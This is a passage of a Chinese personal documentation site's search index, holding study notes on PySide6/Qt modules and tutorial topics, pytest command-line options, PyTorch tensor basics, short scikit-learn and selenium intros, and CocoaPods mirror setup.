访问硬件传感器 Qt Serial Port, 与硬件及虚拟串口的交互 Qt Spatial Audio, 在3D空间中建模声源及其周围环境 QtSql, 提供与数据库的无缝衔接 QtStateMachine, 创建和执行状态图 (没懂) QtSvg, svg图片的展示 QtSvgWidgets, svg相关控件 QtTest, Qt 的单元测试库 QtUiTools, 处理 Qt Designer 设计的内容, 应该是 .ui 文件 Qt WebChannel, 无缝衔接对 HTML/JavaScript 的访问, 主要是通过其 QObject 或 QML objects QtWebEngine Core C++ Classes, QtWebEngine 和 QtWebEngineWidgets 的公共 API 共享 QtWebEngine Widgets C++ Classes, 提供Qt 应用内 C++ 类对 Web 部分内容的渲染 QtWebEngine QML Types, Qt 应用内 QML 类型对 Web 部分内容的渲染 Qt WebSockets, 与 WebSocket 的通信 🪐 QtWidgets, 使用 C++ 的方法, 对 Qt GUI 的拓展 QtXml, 提供了 C++ 层面的 DOM 实现 Qt3DAnimation, 基础的 3D 动画元素 Qt3D Core, 近乎实时模拟系统的功能 方法 Qt3D Extras, Qt 3D 开发的预构建元素 Qt3D Input, Qt 3D 开发下, 处理用户输入 Qt3D Logic, Qt 3D 开发下, 启用帧与Qt 3D后端的同步 Qt3D Render, 支持使用Qt 3D进行2D和3D渲染的功能 Qt CoAP, 实现由RFC 7252定义的CoAP客户端 Qt OPC UA, 用于工业应用中的数据建模和数据交换的协议 Qt MQTT, 提供MQTT协议规范的实现 [1] QML: 是 Qt 为 Qt Quick 打造的描述界面的新语言，然而就语法上，基本就是对 Javascript 做了扩展。 几乎所有 Javascript 的语法都可以使用。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QT-supported-module.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QT-supported-module.html"},{"title":"教程","text":"基本说明见: /docs/后端/python/python三方库/pyside6_more/index Widgets说明 控件示例参考: gallery 常用控件: QPushButton, 可点击的按钮 QLabel, 标签控件 QLineEdit, 行编辑框 创建应用程序都需要先导入 QApplication from PySide6.QtWidgets import QApplication, QLabel app = QApplication([]) # do something # QLabel 参数除了是纯文本, 还可以是 HTML label = QLabel(\"<font color=red size=40>Hello World!</font>\") app.exec() 当 QApplication 不需要参数时, 就给空列表即可, 需要命令行参数就写 sys .argv 信号-槽 机制 Signals and Slots 官网:: Signals and Slots 用于控件之间的通信, 类似于回调函数, Qt 的核心功能 当控件对象发生状态改变时, 信号由控件对象发出 (官网说是真正的对象封装?) 槽用于接收信号 信号也可直接连接到另一个信号, 相当于两个信号同时发生(一个信号发生时, 会立即出发另一个信号, 不论第一个信号发生是否完毕) Qt 内部也预定于了一些槽, 比如 QLineEdit 的 clear 方法 信号与槽的连接使用 connect , 返回 QMetaObject.Connection 对象, 解绑使用这个返回对象的 disconnect() 方法 可用于减少依赖, 解偶? 但是个人觉得, 使用 connet 连接信号和槽的时候还是知道了自己连接了哪个, 只是不知道之后连接的的哪个槽会做出哪些操作, 感觉不算完全结偶 槽 Slot 使用装饰器: from PySide6.QtCore import Slot @Slot() def fun(): pass 使用控件的 connect 连接到槽, clicked 就是信号: # Create a button button = QPushButton(\"Click me\") # Connect the button to the function button.clicked.connect(fun) 显示控件: # Show the button button.show() 注解 其实普通的类似这样的函数定义(无参数的函数定义), 加不加 @Slot 的装饰器实际测试没什么差别, 但是迄今为止还没找到一个合适的说法. 比如? 为什么普通的函数需要加 @Slot 注解? 什么时候起作用? 等等. 官网只有一句这个: Signals can also be connected to free functions 这里没动 free functions 是啥意思, 官网给的例子像是说 外部定义的自由函数? 但是个人觉得应该也包含无参数方法吧. 拓展说明 Signals 自定义信号, 可传入不同的类型: from PySide6.QtCore import Signal Python 类型: signal1 = Signal(int) # Python types Qt 类型: signal2 = Signal(QUrl) # Qt Types 多个参数: signal3 = Signal(int, str, int) # more than one type 可选参数: signal4 = Signal((float,), (QDate,)) # optional types Signal 可接受的关键词参数: name: str 表示这个槽的名称, 若没指定, 则使用变量名 arguments: list 可用于 QML 应用, 表示按照名称引用发射值 如: sumResult = Signal(int, arguments=['sum']) QML: Connections { target: ... function onSumResult(sum) { // do something with 'sum' } Slot 与信号类似, 支持传入类型: @Slot(str) def slot_function(self, s): ... 可接受的关键字参数: name: str 槽名称, 未指定则为函数名 result: 返回类型, 可以是 Python 类型, 也可以是 C 类型 不同类型的超载信号与槽 即一个信号可接受可变类型参数, 如可接受 int 与 str 类型: Signal((int,), (str,)) 列官网例子: import sys from PySide6.QtWidgets import QApplication, QPushButton from PySide6.QtCore import QObject, Signal, Slot class Communicate(QObject): # create two new signals on the fly: one will handle # int type, the other will handle strings speak = Signal((int,), (str,)) def __init__(self, parent=None): super().__init__(parent) self.speak[int].connect(self.say_something) self.speak[str].connect(self.say_something) # define a new slot that receives a C 'int' or a 'str' # and has 'say_something' as its name @Slot(int) @Slot(str) def say_something(self, arg): if isinstance(arg, int): print(\"This is a number:\", arg) elif isinstance(arg, str): print(\"This is a string:\", arg) if __name__ == \"__main__\": app = QApplication(sys.argv) someone = Communicate() # emit 'speak' signal with different arguments. # we have to specify the str as int is the default someone.speak.emit(10) someone.speak[str].emit(\"Hello everybody!\") 控件布局 布局 相关控件: QHBoxLayout, 水平布局(从左到右) QVBoxLayout, 垂直布局(从上到下) QGridLayout, 格子布局 QFormLayout, 只有两列的格子布局 设置一个水平布局: self._layout = QHBoxLayout(self) 布局内加入两个控件, 控件水平方向占比为 1:4 self._layout.addWidget(self._m_left_side_window, 1) self._layout.addWidget(self._m_main_window, 4) 与以下代码效果一致: self._layout.addWidget(self._m_left_side_window, ) self._layout.addWidget(self._m_main_window, ) self._layout.setStretchFactor(self._m_left_side_window, 1) self._layout.setStretchFactor(self._m_main_window, 4) 有时有设置控件布局的需求: # xx_widget.setLayout(self._layout) self.setLayout(self._layout) 使用 ``resize(width, heigth)`` 与 使用布局控件如 ``QVBoxLayout`` 垂直布局是冲突的 resize(width, heigth) 表示自定义窗体大小, 这个时候是需要自己进行手动布局的, 且需要手动执行 show() 才可以显示控件 使用布局控件, 布局控件会自动帮你调整其内容大小, 只有最顶层的需要调用 show() , 需要注意的是, 其下如果有控件没放到布局内部, 还是需要手动 show addStretch(), 填充一个空白位置 显示表格数据的两个控件 QTableWidget 搭配 QTableWidgetItem(表示每一个单元格) 使用, 简单一点, 但是大数据时候不卡 QTableView 复杂一点, 大数据流畅 QTableWidget 部分方法: setHorizontalHeaderLabels 设置表格头, 参数为 str或者list类型 展示/更新颜色控件 QColor 一些基本颜色与对应16进制: colors = [(\"Red\", \"#FF0000\"), (\"Green\", \"#00FF00\"), (\"Blue\", \"#0000FF\"), (\"Black\", \"#000000\"), (\"White\", \"#FFFFFF\"), (\"Electric Green\", \"#41CD52\"), (\"Dark Blue\", \"#222840\"), (\"Yellow\", \"#F9E56d\")] 树控件 QTreeWidget, 与 QTreeWidgetItem 协作 QTreeView 图表控件 QPieSeries, 饼状图 QLineSeries, 折线图 QChart QChartView 可参考例子: Expenses Tool Tutorial 异步编程 trio 模块 ui 文件配置 感觉没有手写方便, 先略过 qrc 文件配置 .qrc 是用来配置二进制资源文件的, 通过此文件加载响应的资源文件如字体, 图标, 然后使用 控件 如: QFile, QIcon 一个图标qrc文件 icons.qrc: </ui> <!DOCTYPE RCC><RCC version=\"1.0\"> <qresource> <file>icons/play.png</file> <file>icons/pause.png</file> <file>icons/stop.png</file> <file>icons/previous.png</file> <file>icons/forward.png</file> </qresource> </RCC> 使用 pyside6-rcc 转换为 Python 文件: pyside6-rcc icons.rc -o rc_icons.py 原来代码: from PySide6.QtGui import QIcon, QKeySequence playIcon = self.style().standardIcon(QStyle.SP_MediaPlay) 修改后的代码: from PySide6.QtGui import QIcon, QKeySequence, QPixmap playIcon = QIcon(QPixmap(\":/icons/play.png\")) 多语言支持 Qt Linguist 官网称做: Qt Linguist 见: translations 使用 self.tr() count = len(self._list_widget.selectionModel().selectedRows()) message = self.tr(\"%n language(s) selected\", \"\", count) 翻译文件为基于 XML 的 .ts 文件, 通过 lupdate 提取: pyside6-lupdate main.py main.qml form.ui -ts example_de.ts 文件已存在则为更新模式. 转换为二进制的 .qm 文件: mkdir translations pyside6-lrelease example_de.ts -qm translations/example_de.qm 建议通过 .qrc 文件来使用: <!DOCTYPE RCC><RCC version=\"1.0\"> <qresource> <file>translations/example_de.qm</file> </qresource> </RCC> 代码中路径形式: :/translations/example_de.qm 代码中通过 QTranslator 来加载: path = QLibraryInfo.location(QLibraryInfo.TranslationsPath) translator = QTranslator(app) if translator.load(QLocale.system(), 'qtbase', '_', path): app.installTranslator(translator) translator = QTranslator(app) path = ':/translations' if translator.load(QLocale.system(), 'example', '_', path): app.installTranslator(translator) 第一次加载 Qt 的翻译, 第二次加载资源文件的翻译. 可通过以下方式运行: LANG=de python main.py GNU gettext 相关可参考 /docs/后端/python/python标准库/gettext 例子, 最顶部定义 import gettext ... _ = None ngettext = None 翻译部分定义 src_dir = Path(__file__).resolve().parent try: translation = gettext.translation('example', localedir=src_dir / 'locales') if translation: translation.install() _ = translation.gettext ngettext = translation.ngettext except FileNotFoundError: pass if not _: _ = gettext.gettext ngettext = gettext.ngettext 将会找 locales 下的 example 使用 file_menu = self.menuBar().addMenu(_(\"&File\")) 转换 .pot 文件: mkdir -p locales/de_DE/LC_MESSAGES xgettext -L Python -o locales/example.pot main.py 文件头大概如下: \"Project-Id-Version: PySide6 gettext example\\n\" \"POT-Creation-Date: 2021-07-05 14:16+0200\\n\" \"Language: de_DE\\n\" \"MIME-Version: 1.0\\n\" \"Content-Type: text/plain; charset=UTF-8\\n\" \"Content-Transfer-Encoding: 8bit\\n\" \"Plural-Forms: nplurals=2; plural=n != 1;\\n\" 翻译内容大概如下: #: main.py:57 msgid \"&File\" msgstr \"&Datei\" 转换为 .mo 翻译文件: msgfmt -o example.mo example.pot 运行: LANG=de python main.py 控件样式 默认使用当前平台系统的主题. 也可自定义样式 自定义方式: 使用 Qt 提供的部分样式, 如: w = QLabel(\"This is a placeholder text\") w.setAlignment(Qt.AlignCenter) 类 CSS 语法, 如: w.setStyleSheet(\"\"\" background-color: #262626; color: #FFFFFF; font-family: Titillium; font-size: 18px; \"\"\") 多个类 CSS 样式可以使用 .qss 文件 注解 使用字体需要先安装. 可以使用 QFontDatabase 查看已安装字体, 使用 families() 指定. .qss 文件说明: 与 CSS 文件基本是一致的, 不过可以直接使用控件类名来指定样式: QLabel { background-color: red; } 也可以设置控件类对象的名称, 如: QLabel#title { font-size: 20px; } 而对于某些预定义控件下的控件, 如 QListWidget 下的 QListWidgetItem QListWidget::item { height: 50px; } 同样的, 选中状态定义: QListWidget::item:selected { background-color: #2ABf9E; qproperty-alignment: AlignCenter; } 代码中这样定义: label = QLabel(\"Test\") label.setObjectName(\"title\") 使用自定义的样式文件, 使用 setStyleSheet if __name__ == \"__main__\": app = QApplication() w = Widget() w.show() with open(\"style.qss\", \"r\") as f: _style = f.read() app.setStyleSheet(_style) sys.exit(app.exec()) 这样设计可以很好的去 解耦 移植 C++ 应用到 Python Qt 称 重写 更贴切. 参考: Porting a C++ Application to Python","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Tutorial.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Tutorial.html"},{"title":"Pyside6","text":"基本概念说明 Qt, QML, Widgets区别 参考:: Qt, QML, Widgets…What Is The Difference? Qt 可以是使用 C++ 开发的 Qt 框架, 也可以是 使用此框架开发的 Qt 应用程序. QML Qt设计的一种类似 CSS, JSON 的语言, 同时允许 JavaScript , 用于创建 UI 应用 可被其他组件集成, 可被 C++ 代码使用. Widgets 预定义的一些 Qt 控件, 控件原则是: 基本与系统原生窗口外观一致. 如果需要更新外观样式(可能会违背上面的原则), 参考... 没参考了, 官网文档都 404 了... Python And C++ 使用 Python 开发时, 不需要了解 C++ 的实现. 不过可以混合使用. 在用户代码级别, Python 实现基本做到了全覆盖(C++ 的实现), 可以任意重写 若使用 C++ 自定义控件, 可以创建 Python 绑定以便于在 Python 使用 若有特殊的需求实现需要使用到自定义的 C++ 库, 也可以创建其绑定以便 Python 使用 对于一个 C++ 的 Qt 程序而言, 可以通过暴露单例的 Python 绑定 给 Python 解释器以便其使用 (就像一个 Python 插件系统) 不过这些实现(后面三个实现), 依赖于 Shiboken (绑定生成工具) 文件类型 官网:: File Types .ui , 类似 XML 文件的形式来绘制 GUI 界面, 使用 pyside6-uic 将其转换为 Python 代码. 编写参考: using-ui-files .qrc , 资源文件, 编写方式类似 XML, 使用 pyside6-rcc 将其转换为 Python 代码. 编写参考: using-qrc-files .qml , 语言文件, 绘制页面. .pyproject , 新版本内容是基于 JSON 的格式. 可用于配置给 C++ 项目处理的一些文件. 一些命令行 参考:: Which IDEs Are Compatible? 打开 Qt Designer 工具以创建 .ui 文件: pyside6-designer 将 .ui 文件转换为 Python 代码: pyside6-uic -i form.ui -o ui_form.py 将 .qrc 文件转换为 Python 代码: pyside6-rcc -i resources.qrc -o rc_resources.py 可使用的开发工具(IDE) QtCreator, 有个好处是有一些模版可以使用, 下载: QtCreator (这个还真没听说过, 有空了解一下) Visual Studio Code, 需要安装插件: ext install seanwu.vscode-qt-for-python PyCharm, 需手动配置相关工具. 如 Qt Designer . 配置位置: File > Settings > tools > PyCharm External Tools Shiboken - 绑定生成器(Python/C++) 下包含函数: /docs/后端/python/python三方库/pyside6_more/modules/Shiboken pip 安装的时候, 默认会一起安装的模块: yanque@yanquedembp code % pip list | grep shiboken shiboken6 6.4.0.1 包含了一些工具来保证 Pyside 可以正确运行 (主用于debug吧) 还有一个 Shiboken Generator 默认不会自动一起安装. 教程中提到的 Shiboken 大多指的是 Shiboken Generator , 详见: /docs/后端/python/python三方库/pyside6_more/modules/Shiboken Generator 什么时候需要 Shiboken Generator ? 若仅运行一个 Python 级别的 Qt 应用, 则不需要 若需要于 C++ 层面的代码结合, 如继承或自定实现的 C++ 的绑定, 需要 项目部署 官网:: distribution deployment 尤其是跨平台时. 官方建议是构建冻结文件, 其实就是将代码打包成平台的相应包, 不同的模块可以打包成不同的包以适配大型应用, 因为这样可以分布式的更新仅需更新的文件. 个人比较熟悉的是: deployment-nuitka","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-index.html"},{"title":"支持的模块","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-index.html"},{"title":"pytest","text":"使用见: /docs/后端/python/教程/Pytest 语法: pytest [options] [file_or_dir] [file_or_dir] [...] # positional arguments: # file_or_dir 选项参数 general: --capture= method 捕获消息的类型 fd|sys|no|tee-sys. -s 上面为no时的简写 --capture=no. 后面看到一个说法是输出包含stdout与stderr. 正常情况下,pytest会捕获测试中的stdout和stderr,并只在测试失败时才将其打印出来。 使用-s选项后,pytest将不会捕获stdout和stderr,而是直接打印。 这在调试测试用例时非常有用,可以直接在控制台看到print的输出,而不需要添加失败的断言来查看输出。 --show-capture= <{no,stdout,stderr,log,all}> Controls how captured stdout/stderr/log is shown on Write captured log messages to JUnit report: one of -m <some_test> 指定要运行哪些测试 -m MARKEXPR 仅运行 @pytest.mark.MARKEXPR 装饰的测试. 如: -m 'mark1 and not mark2'. -k EXPRESSION 仅执行匹配 EXPRESSION 的测试, 支持通配符, 多个使用引号包裹, or 隔开. 如: -k 'test_method or test_other' 表示 会执行所有 函数名/类名包含 'test_method' or 'test_other' 的测试; -k 'not test_method' 表示仅执行不包含 'test_method' 的测试; -k 'not test_method and not test_other' 表示两者之一被包含的测试会被排除. --markers show markers, 即上面 -m 的 MARKEXPR -x , --exitfirst 当测试错误/执行失败, 立即退出执行, 不会运行后面的测试 --fixtures , --funcargs show available fixtures, sorted by plugin appearance (fixtures with leading '_' are only shown with '-v') --fixtures-per-test show fixtures per test --pdb 在错误或者键盘中断(Ctrl + C)时候, 开始一个交互式的 pdb debugger (终端). --pdbcls= <modulename:classname> 使用 --pdb 来开启一个 debug 终端. 此时可加此选项来指定终端类型, 如: --pdbcls=IPython.terminal.debugger:TerminalPdb --trace 在运行每项测试时立即中断, 用于 debug. --runxfail 报告标记 XFAIL 测试的结果, 就像他们没有被标记一样. --lf , --last-failed 在最后一次运行时, 仅重新运行失败的测试(如果没有失败，则全部运行) --ff , --failed-first 运行所有测试，但先运行最后的失败。 这可能会重新安排测试，从而导致 固件的重复 安装/卸载. --nf , --new-first 首先运行最新的文件的测试, 然后按照文件的 mtime (修改时间) 顺序执行. --cache-show= <[CACHESHOW]> 不执行测试收集/测试, 显示缓存内容. Optional argument: glob (default: '*'). --cache-clear 测试开始前移除所有的缓存内容. --lfnf= <{all,none}> , --last-failed-no-failures= <{all,none}> 在之前没有（已知）故障的情况下运行哪些测试? 原句: which tests to run with no previously (known) failures. --sw , --stepwise 当测试失败时退出, 下一次从次失败的测试开始执行 --sw-skip , --stepwise-skip 仅忽略第一个失败的测试, 即后续还有失败会停止 隐式启用 --stepwise. -v 启用冗长日志记录,会打印更详细的测试结果。 -v v 启用更加详细的日志,会打印测试相关的所有输出,包括: 测试开始和结束的日志; 测试文件路径; 通过的测试用例名称; 失败的测试用例名称及失败原因; 跳过的测试用例名称及跳过原因; 所有打印的输出(类似-s选项); 用于记录测试结果的文件路径; ``-m MARKEXPR`` 说明 : 作用为指定运行哪些测试用例, MARKEXPR 表示装饰器的标记, 多个使用引号包裹, or 隔开: pytest -m \"test_run1 or test_run2 or test_run3\" 表示仅运行以下装饰器修饰的测试: @pytest.mark.test_run1 @pytest.mark.test_run2 @pytest.mark.test_run3 捕获方式 capture 说明 : fd, 文件描述符级别的捕获, 也就是写入到 1 , 2 标准输出/错误的内容会被捕获 sys, 使用 sys.stdout , sys.stderr 输出的消息会被捕获 no, 禁止捕获所有输出. tee-sys 个人理解: 这里的捕获, 即将本来应该立即输出到到控制台/文件的信息截取, 可以加一些自定义的操作. 默认是 all , 捕获所有信息, 所以不会实时输出而是结束后一起输出 如果想 实时输出信息 那么需要使用, -s 或者 --capture=no , 实际测试也不是必须 日志选项 可以 pytest -h 查看帮助文档, logging 相关部分内容如下: logging: --log-level=LEVEL level of messages to catch/display. Not set by default, so it depends on the root/parent log handler's effective level, where it is \"WARNING\" by default. --log-format=LOG_FORMAT log format as used by the logging module. --log-date-format=LOG_DATE_FORMAT log date format as used by the logging module. --log-cli-level=LOG_CLI_LEVEL cli logging level. --log-cli-format=LOG_CLI_FORMAT log format as used by the logging module. --log-cli-date-format=LOG_CLI_DATE_FORMAT log date format as used by the logging module. --log-file=LOG_FILE path to a file when logging will be written to. --log-file-level=LOG_FILE_LEVEL log file logging level. --log-file-format=LOG_FILE_FORMAT log format as used by the logging module. --log-file-date-format=LOG_FILE_DATE_FORMAT log date format as used by the logging module. --log-auto-indent=LOG_AUTO_INDENT Auto-indent multiline messages passed to the logging module. Accepts true|on, false|off or an integer. 有三种使用方式: A: pytest test_xxx.py --log-cli-level=info B, 编辑pytest.ini或tox.ini或setup.cfg文件: [pytest] log_cli = 1 log_cli_level = INFO log_cli_format = %(asctime)s [%(levelname)8s] %(message)s (%(filename)s:%(lineno)s) log_cli_date_format=%Y-%m-%d %H:%M:%S C, 用pytest -o方式重写(pytest 3.4之后): pytest test_xxx.py -o log_cli=true -o log_cli_level=INF 警告相关: pytest-warnings: -W PYTHONWARNINGS, --pythonwarnings=PYTHONWARNINGS Set which warnings to report, see -W option of Python itself --maxfail=num Exit after first num failures or errors --strict-config Any warnings encountered while parsing the `pytest` section of the configuration file raise errors --strict-markers Markers not registered in the `markers` section of the configuration file raise errors --strict (Deprecated) alias to --strict-markers -c file Load configuration from `file` instead of trying to locate one of the implicit configuration files --continue-on-collection-errors Force test execution even if collection errors occur --rootdir=ROOTDIR Define root directory for tests. Can be relative path: 'root_dir', './root_dir', 'root_dir/another_dir/'; absolute path: '/home/user/root_dir'; path with variables: '$HOME/root_dir'. 使用pytest.ini文件 使用 pytest.ini 文件配置测试用例 文件一般建立在项目根目录下. 也不是强制性, 在哪个目录下执行 pytest 命令, 就在哪个目录下寻找 pytest.ini , 不支持放在子目录下(除非去子目录跑测试) 一般配置模版: [pytest] # 然后写配置项 支持的配置选项(部分): addopts, 额外命令行选项, 可以更改默认命令行选项, 即在命令行补充参数, 如果有一样的选项, 尽量合并(看效果是) testpaths, 执行用例的目录 python_file, 执行文件名 python_classes, 执行的类名 python_functions, 执行方法名 usefixtures, 指定使用哪些固件. cache_dir, 缓存目录 log_level, 日志等级, 默认是 --log-level 的 warring log_format, 日志格式 log_file_date_format, 日志日期格式 log_auto_indent, 日志缩进 pythonpath, 将路径加入到 sys.path minversion, pytest最低版本 required_plugins, 需要加载的插件 支持的环境变量 environment variables: PYTEST_ADDOPTS, 额外命令行选项 PYTEST_PLUGINS, 启动时加载的插件, 多个使用逗号分隔 PYTEST_DISABLE_PLUGIN_AUTOLOAD, 设置不加载的插件 PYTEST_DEBUG, 调试相关, set to enable debug tracing of pytest's internals 自定义mark装饰器 比如: @pytest.mark.mytest 直接使用这种自定义的mark表示, 会有警告: pytest.unknown_mark_warning 注解 使用 pycharm测试时, 会自动加上 -q 等参数, 所以看不到警告, 暂时没找到怎么覆盖这些配置, 只有手动跑才能看到了 但是实际是自己有使用的, 这个时候需要将这个配置项添加到pytest.ini文件: [pytest] markers = mytest: 表示一个自定义mark标记 格式为自定义表示的名称name, 与含义说明. 若不方便配置ini文件, 可以在conftest.py中手动使用config写入: # conftest.py # coding: utf-8 from _pytest.config import Config def pytest_configure(config: Config): config.addinivalue_line( 'markers', 'mytest1: mark_mytest1', ) 第一个参数就是上面说的name, 第二个参数就是描述, 注解 像这种在代码中补充配置的, 必须在插件的注册阶段使用, 所以 必使用pytest_configure定义在conftest.py, 无法写在具体的固件@fixture中, 即使fixture定义在conftest. 一些其他指令 查看所有预定义固件: pytest --fixtures 查看所有预定义标记: pytest --markers 一些使用技巧 跳过所有测试用例 直接命令行设置: pytest -m \"\" 但是有时候不方便直接修改命令行, 还可以在 pytest.ini 设置: [pytest] addopts = -m \"\" 注解 实际使用中发现, 在有些版本 -m \"\" 表示会执行所有的测试用例, 而有些版本全都不会运行. 有时禁用所有测试会导致测试错误, 这时候也可使用 -k 指定一个耗时少的测试: -k \"测试函数名/文件名\" 实时打印日志 日志使用可参考: 日志选项 还是使用 /docs/后端/python/python标准库/logging 模块. 与平时使用无差别, 测试时加启动参数 --capture=no 即可, 或者 -s 效果一致: _logger = logging.getLogger(__name__) _logger.setlevel(logging.INFO) _logger.info('xxx') 实际就是: pytest test_xxx.py --log-cli-level=info --capture=no pytest test_xxx.py --log-cli-level=info -s 打印乱码问题 在最高级别的conftest.py添加如下代码即可: def pytest_collection_modifyitems(items): \"\"\" 测试用例收集完成时，将收集到的item的name和nodeid的中文显示在控制台上 :return: \"\"\" for item in items: item.name = item.name.encode(\"utf-8\").decode(\"unicode_escape\") item._nodeid = item.nodeid.encode(\"utf-8\").decode(\"unicode_escape\") 隐藏警告 可在 pytest.ini 文件中添加以下行来隐藏警告: addopts = -p no:warnings 这将禁用所有警告. 如果您只想隐藏特定的警告，可以使用filterwarnings选项。 例如，以下配置将忽略所有用户警告和与正则表达式匹配的特定弃用警告，但将所有其他警告转换为错误: filterwarnings = ignore::UserWarning regex:DeprecationWarning 其他后续补充...","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest.html"},{"title":"Pytest常见问题","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-index.html"},{"title":"pytest","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-index.html"},{"title":"pytorch","text":"参考: 60分钟快速入门 PyTorch PyTorch 是由 Facebook 开发，基于 Torch 开发， 从并不常用的 Lua 语言转为 Python 语言开发的深度学习框架， Torch 是 TensorFlow 开源前非常出名的一个深度学习框架， 而 PyTorch 在开源后由于其使用简单， 动态计算图的特性得到非常多的关注，并且成为了 TensorFlow 的 最大竞争对手。 安装: pip3 install torch torchvision torchaudio 检测是否适用于当前机器显卡: import torch print(torch.cuda.is_available()) 张量(Tensors) 相当于 Numpy 的多维数组(ndarrays)。两者的区别就是 Tensors 可以应用到 GPU 上加快计算速度 声明与定义 torch.empty() 声明一个未初始化的 Tensors 矩阵 torch.rand() 随机初始化一个矩阵 torch.zeros() 创建数值皆为 0 的矩阵 torch.ones() 创建数值皆为 1 的矩阵 torch.tensor() 直接传递 tensor 数值来创建 tensor.new_ones() 根据已有的 tensor 变量创建新的 tensor 变量 torch.randn_like(old_tensor) 保留相同的尺寸大小 tensor.size() 获取张量大小 关于API的详细说明, 见 /docs/后端/python/python三方库/pytorch/API 和 Numpy 数组的转换 Tensor 和 Numpy 的数组可以相互转换， 并且两者转换后共享在 CPU 下的内存空间， 即改变其中一个的数值，另一个变量也会随之改变。 Tensor 转换为 Numpy 数组 实现 Tensor 转换为 Numpy 数组的例子如下所示， 调用 tensor.numpy() 可以实现这个转换操作: a = torch.ones(5) print(a) b = a.numpy() print(b) 输出结果: tensor([1., 1., 1., 1., 1.]) [1. 1. 1. 1. 1.] b 也随着 a 的改变而改变: a.add_(1) print(a) print(b) 输出结果: tensor([2., 2., 2., 2., 2.]) [2. 2. 2. 2. 2.] Numpy 数组转换为 Tensor 转换的操作是调用 torch.from_numpy(numpy_array) 方法。 例子如下所示: import numpy as np a = np.ones(5) b = torch.from_numpy(a) np.add(a, 1, out=a) print(a) print(b) 输出结果: [2. 2. 2. 2. 2.] tensor([2., 2., 2., 2., 2.], dtype=torch.float64) 在 CPU 上，除了 CharTensor 外的所有 Tensor 类型变量，都支持和 Numpy数组的相互转换操作 CUDA 张量 Tensors 可以通过 .to 方法转换到不同的设备上，即 CPU 或者 GPU 上。 例子如下所示: # 当 CUDA 可用的时候，可用运行下方这段代码，采用 torch.device() 方法来改变 tensors 是否在 GPU 上进行计算操作 if torch.cuda.is_available(): device = torch.device(\"cuda\") # 定义一个 CUDA 设备对象 y = torch.ones_like(x, device=device) # 显示创建在 GPU 上的一个 tensor x = x.to(device) # 也可以采用 .to(\"cuda\") z = x + y print(z) print(z.to(\"cpu\", torch.double)) # .to() 方法也可以改变数值类型 输出结果，第一个结果就是在 GPU 上的结果， 打印变量的时候会带有 device='cuda:0'，而第二个是在 CPU 上的变量: tensor([1.4549], device='cuda:0') tensor([1.4549], dtype=torch.float64)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-index.html"},{"title":"sklearn提供的API","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-index.html"},{"title":"scikit-learn","text":"介绍 Scikit-learn是一个非常强大的工具，能为库的开发提供了高水平的支持和严格的管理。 清晰一致的代码样式可确保我们的机器学习代码易于理解和再现，并大大降低了对机器学习模型进行编码的入门门槛。 Scikit-learn得到了很多第三方工具的支持，有非常丰富的功能适用于各种用例。 有一个中文社区(不知是官方还是自由社区): https://scikit-learn.org.cn 安装: pip install scikit-learn","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-index.html"},{"title":"问题/报错总结","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-index.html"},{"title":"selenium","text":"中文官网: https://www.selenium.dev/zh-cn/documentation/webdriver/ 入门: https://www.selenium.dev/zh-cn/documentation/webdriver/getting_started/ 下载chrome驱动: http://chromedriver.storage.googleapis.com/index.html 注解 此文档基于 selenium 4.0 Selenium 是支持 web 浏览器自动化的一系列工具和库的综合项目。 Selenium 通过使用 WebDriver 支持市场上所有主流浏览器的自动化。 Webdriver 是一个 API 和协议，它定义了一个语言中立的接口，用于控制 web 浏览器的行为。 每个浏览器都有一个特定的 WebDriver 实现，称为驱动程序。 驱动程序是负责委派给浏览器的组件，并处理与 Selenium 和浏览器之间的通信。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-index.html"},{"title":"包管理工具pod(cocoapods)","text":"参考: https://juejin.cn/post/6932739864613879821 类似于Java的Maven 需要先有Ruby, 因为pod是用Ruby写的, 可参考: /docs/后端/ruby/index 安装: gem install cocoapods pod setup 配置镜像 参考: https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/ 内容: CocoaPods 是一个 Cocoa 和 Cocoa Touch 框架的依赖管理器，具体原理和 Homebrew 有点类似，都是从 GitHub 下载索引，然后根据索引下载依赖的源代码。 对于旧版的 CocoaPods 可以使用如下方法使用 tuna 的镜像： $ pod repo remove master $ pod repo add master https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git # 把所有上传到cocoapods的第三方框架下载每个版本和网络地址以及一些其他描述信息到本地 $ pod repo update 新版的 CocoaPods 不允许用pod repo add直接添加master库了，但是依然可以： $ cd ~/.cocoapods/repos $ pod repo remove master $ git clone 